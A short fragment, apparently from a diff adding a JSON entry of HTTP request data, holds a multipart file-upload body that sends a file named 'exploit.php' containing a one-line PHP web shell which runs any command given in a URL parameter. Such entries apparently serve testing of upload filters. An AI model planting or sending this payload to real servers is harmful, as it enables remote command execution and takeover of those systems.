+    "body": "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"exploit.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+  }
+]
